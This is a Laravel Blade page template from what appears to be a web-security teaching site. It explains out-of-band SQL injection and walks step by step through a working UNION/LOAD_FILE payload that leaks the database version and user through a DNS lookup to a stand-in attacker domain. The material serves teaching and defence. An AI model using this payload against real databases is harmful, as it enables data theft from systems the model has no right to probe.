@if (Route::has('login'))
    @auth
    <script >window.location = "{{ url('/index') }}";</script>
    @else


@include('layouts.navigation_out')

    <div class="main">

        <div class="description" style="border-radius: 10px 10px 0px 0px; padding: 10px 10px 0px 10px;">

            <div class="sub_description" style="background-image: url('images/out_of_band.png');">

                <h2 style="margin-top: 0px;">Out Of Band SQLi</h2>

                <p><b>Description: </b>Out-of-band SQL Injections sends the response from the database to an attacker's remote endpoint. Out-of-band SQL injection becomes feasible only when the database server being utilised supports commands that initiate DNS or HTTP requests. However, this condition holds true for most widely used SQL servers.</p>
            </div>

            

        </div>

        <div class="description" style="border-radius: 0px; padding: 0px 10px 0px 10px;">

            <div class="sub_description" style="background-image: url('images/example.png'); margin: 10px 15px 10px 15px; background-size: 192.53px 224.66px;">

                <p style="margin-top: 0px;"><b>Example: </b>In our scenario, an attacker uses out-of-band SQL injection through DNS on a search function.</p>

                

                <ol>

                    <li>This is the query for the search function used:</li>
                    <br>
                    <span class="code_space">SELECT name FROM product WHERE name = '$name';</span>
                    <br>
                    <br>
                    <li>Then the attacker proceeds to use this payload:</li>
                    <br>
                    <div class="code_space">' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt')) --</div>
                    <br>
                    <li>The query will now look like this:</li>
                    <br>
                    <div class="code_space"><span style="color: purple;">SELECT</span> name <span style="color: purple;">FROM</span> product <span style="color: purple;">WHERE</span> name <span style="color: deeppink;">=</span> <span style="color: brown;">''</span> <span style="color: purple;">UNION</span> <span style="color: purple;">SELECT</span> <span style="color: purple;">LOAD_FILE</span><span style="color: purple;">CONCAT</span>(<span style="color: brown;">'\\\\'</span>,(<span style="color: purple;">SELECT</span> <span style="color: deeppink;">+</span><span style="color: deeppink;">+</span><span style="color: purple;">@@version</span>),<span style="color: brown;">'.'</span>,(<span style="color: purple;">SELECT</span> <span style="color: purple;">CURRENT_USER</span>),<span style="color: brown;">'.example.com\\test.txt'</span>)) <span style="color: purple;">--</span> <span style="color: brown;">';</span></div>
                </ol>
        


                <button class="buttons" id="readMore" onclick="toggle()">Read More</button>

                <div id="road">

                <ol style="margin-top: 0px;">

                    <p style="margin-top: 0px;">Let's break down how the command works:</p>

                    <ul>
                        
                        
                        <li>In combination with the union command, the attacker first closes of the query with a single quotation and uses the union operator to combine and perform the out-of-band injection.</li>
                        <br>
                        <span class="code_space"><span style="color: red;">' UNION</span> SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt'));</span>
                        <br>
                        <br>
                        <li style="line-height: 30px;">The <span class="code_space" style="padding: 5px 5px 5px 5px;">CONCAT</span> command in SQL combines words or results of commands, separated by commas into a single sentence (Sidenote: To represent a single backslash within the query, it needs to have two backslashes):</li>
                        <br>
                        <span class="code_space">' UNION SELECT LOAD_FILE(<span style="color: red;">CONCAT('\\\\',(SELECT+@@version),'.',(SELECT CURRENT_USER),'.example.com\\test.txt')</span>);</span>
                        <br>
                        <br>
                        <li>So, it will look like this when concatenated:</li>
                        <br>
                        <span class="code_space">' UNION SELECT LOAD_FILE(<span style="color: red;">\\SELECT+@@version.SELECT CURRENT_USER.example.com\test.txt'</span>);</span>
                        <br>
                        <br>
                        <li style="line-height: 30px;">The <span class="code_space" style="padding: 5px 5px 5px 5px;">LOAD_FILE</span> file function is used to read files from a directory, this directory is retrieved from the <span class="code_space" style="padding: 5px 5px 5px 5px;">secure_file_priv</span> variable within the database.  The <span class="code_space" style="padding: 5px 5px 5px 5px;">LOAD_FILE</span> function can only read files specified from the <span class="code_space" style="padding: 5px 5px 5px 5px;">secure_file_priv</span> variable, in our scenario, the <span class="code_space" style="padding: 5px 5px 5px 5px;">secure_file_priv</span> variable is left empty.</li>
                        <br>
                        <span class="code_space">' UNION SELECT <span style="color: red;">LOAD_FILE(\\SELECT+@@version.SELECT CURRENT_USER.example.com\test.txt')</span>;</span>
                        <br>
                        <br>
                        <br>
                        <li>The <span class="code_space">LOAD_FILE</span> command will then actively search for the location specified within the <span class="code_space">LOAD_FILE</span> function.</li>
                        <br>
                        <span class="code_space">\\SELECT+@@version.SELECT CURRENT_USER.example.com\test.txt'</span>
                        <br>
                        <br>

                        <li>This will trigger a request to the attacker's server that is hosting the website "example.com", along with the results of the SQL commands within the same link. And thus the attacker will see:</li>
                        <br>
                        <span class="code_space">\10.4.32-MariaDB.root@localhost.example.com\test.txt</span>

                    </ul>

                </ol>

                    <button class="buttons" id="readLess" onclick="toggleOff()" style="display: none;">Read Less</button>

                </div>

                

                
            </div>

            
        </div>

                <div class="description" style="border-radius: 0px 0px 10px 10px; padding: 0px 10px 10px 10px;">
                <div class="sub_description" style="background-image: url('images/con.png'); margin: 10px 15px 10px 15px; background-size: 214.17px 197.67px;">
                    <p style="margin-top: 0px; margin-bottom: 0px;"><b>Consequences: </b>Within your database, if there are certain configurations enabled, attacks can use functions like LOAD_FILE() to send sensitive data over to an attacker's server.</p>
                </div>

        </div>

    </div>

<script>

function toggle() {
            var x = document.getElementById("road");
            x.classList.toggle('active');
            var y = document.getElementById("readMore");
            y.style.display = 'none';
            var y = document.getElementById("readLess");
            y.style.display = 'block';
        }
function toggleOff() {
            var x = document.getElementById("road");
            x.classList.toggle('active');
            var y = document.getElementById("readMore");
            y.style.display = 'block';
            var y = document.getElementById("readLess");
            y.style.display = 'none';
        }

</script>

@endauth

@endif
